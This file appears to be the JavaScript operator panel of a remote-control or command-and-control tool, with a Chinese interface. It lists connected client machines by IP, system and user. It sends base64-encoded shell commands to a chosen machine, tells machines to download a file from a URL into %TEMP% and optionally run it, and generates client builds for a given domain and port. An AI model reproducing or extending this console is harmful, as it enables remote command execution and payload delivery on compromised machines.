var u = prompt("username：", "admin");
var p = prompt("password：", "123456");
var base = new Base64();
var loc = window.location;
var uri = 'ws:';
var nowhandle = '';
var nowip = '';
if (loc.protocol === 'https:') {
    uri = 'wss:';
}
uri += '//127.0.0.1:3287';


ws = new WebSocket(uri);
ws.onopen = function () {
    ws.send(JSON.stringify({"username": u, "password": p}));


};
ws.onmessage = function (evt) {
    console.log(evt.data);
    let data = JSON.parse(evt.data)
    if (data["login"] === true) {
        $("#log").append("<p style='color:blue'>后端连接成功</p>")

        for (let i = 0; i < data["data"]["data"].length; i++) {
            let z = data["data"]["data"][i]
            console.log(z)
            $("#server_list").append(
                `<tr id="` + data["data"]["uuid"] + `">
            <td><label>
            <input type="checkbox" name="category" value="` + z["uuid"] + `"/>
            </label></td>
            <td>` + z["info"]["ip"] + `</td>
            <td>` + z["info"]["remarks"] + `</td>
            <td>` + z["info"]["system"] + `</td>
            <td>` + z["info"]["user"] + `</td>
            <td>Loop</td>
            <td>` + z["info"]["iip"] + `</td>
            <td><a href="javascript:new_cmd('` + z["info"]["ip"] + `','` + data["data"]["uuid"] + `');">终端</a> <a href="javascript:download('` + z["info"]["ip"] + `','` + data["data"]["uuid"] + `');" >下载</a> <a href="#">卸载</a></td>
            `
            );
            $("#log").append("<p style='color:green'>客户上线：" + ip + "</p>")
        }
    }
    if (data["action"] === "online") {
        let i = data["data"]["info"]
        $("#server_list").append(
            `<tr id="` + data["data"]["uuid"] + `">
            <td><label>
            <input type="checkbox" name="category" value="` + data["data"]["uuid"] + `"/>
            </label></td>
            <td>` + i["ip"] + `</td>
            <td>` + i["remarks"] + `</td>
            <td>` + i["system"] + `</td>
            <td>` + i["user"] + `</td>
            <td>Loop</td>
            <td>` + i["iip"] + `</td>
            <td><a href="javascript:new_cmd('` + i["ip"] + `','` + data["data"]["uuid"] + `');">终端</a> <a href="javascript:download('` + i["ip"] + `','` + data["data"]["uuid"] + `');" >下载</a> <a href="#">卸载</a></td>
            `
        );
        $("#log").append("<p style='color:green'>客户上线：" + i["ip"] + "</p>")
    }
    if (data["action"] === "offline") {
        $(`#` + data["data"]["uuid"]).remove();
        $("#log").append("<p style='color:#ff0000'>客户下线：" + i["ip"] + "</p>")
    }
    if (data["action"] === "result") {
        if (data["data"]["action"] === "cmd") {
            $(`#cmd_textarea`).val($(`#cmd_textarea`).val() + "From " + data["data"]["uuid"] + ":\n\t" + data["data"]["data"] + "\n");
            $("#cmd_textarea").scrollTop($("#cmd_textarea")[0].scrollHeight);
        }else{
            $("#"+data["data"]["uuid"]+" td")[4].innerText = data["data"]["data"]
            setTimeout(function() {
                $("#"+data["data"]["uuid"]+" td")[4].innerText = "Loop"
            }, 5000);
        }

    }
};
ws.onclose = function () {
    $("#log").append("<p style='color:red'>后端连接失败</p>")
    $("#light").css("display", "none");
    $("#fade").css("display", "none");
};

function cmd_execute() {

    let d = $("#cmd_input").val()
    let p = $("#cmd_param").val()
    let b64 = btoa(JSON.stringify({
        "command": d,
        "param": p
    }))
    ws.send(JSON.stringify(
        {
            "uuid": nowhandle,
            "do": {
                "do": "cmd",
                "data": b64
            }
        }
    ))
    $(`#cmd_textarea`).val($(`#cmd_textarea`).val() + "Send For: " + nowhandle + ":\n\t" + d + " " + p + "\n");
    $("#cmd_textarea").scrollTop($("#cmd_textarea")[0].scrollHeight);
    $("#cmd_input").val("")
    $("#cmd_param").val("")

}

function generate() {
    $("#generate").css("display", "block");
    $("#fade").css("display", "block");
}

function generate_close() {

    $("#generate").css("display", "none");
    $("#fade").css("display", "none");

}

function download_close() {

    $("#download").css("display", "none");
    $("#fade").css("display", "none");

}

function download(ip, id) {
    $("#download").css("display", "block");
    $("#fade").css("display", "block");
    if (nowhandle != id) {
        $("#cmd_textarea").val("")
    }
    nowhandle = id;

    nowip = ip;
}

function cmd_close() {
// document.getElementById('light').style.display='none';
// document.getElementById('fade').style.display='none';
    $("#light").css("display", "none");
    $("#fade").css("display", "none");

}

function new_cmd(ip, id) {
// document.getElementById('light').style.display='block';
// document.getElementById('fade').style.display='block';
    $("#light").css("display", "block");
    $("#fade").css("display", "block");
    nowhandle = id;
    nowip = ip;
    $("#IP").html("目前控制的是：" + ip);

}


function down_btu_on() {
    if ($("#http_address").val() == "") {
        $("#error_http_address").html("网址不能为空");
        return;
    }
    if ($("#save_path").val() == "") {
        $("#error_save_path").html("将写入默认目录");
        $("#save_path").val("%TEMP%")
    }
    let url = $("#http_address").val()
    let path = $("#save_path").val()
    let is_run = $("is_run").val()
    let b64 = btoa(JSON.stringify({
        "url": url,
        "path": path,
        "is_run": is_run
    }))
    ws.send(JSON.stringify(
        {
            "uuid": nowhandle,
            "do": {
                "do": "download",
                "data": b64
            }
        }
    ))
    $("#d_res").html("发送成功");
}

function generate_btu_on() {
    if ($("#domain").val() == "") {
        $("#error_domain").html("域名不能为空");
        return;
    }
    if ($("#port").val() == "") {
        $("#error_port").html("端口不能为空");
        return;
    }
    window.open("/generate?domain=" + $("#domain").val() + "&port=" + $("#port").val() + "&version=" + $("#version").val(), "_blank");
}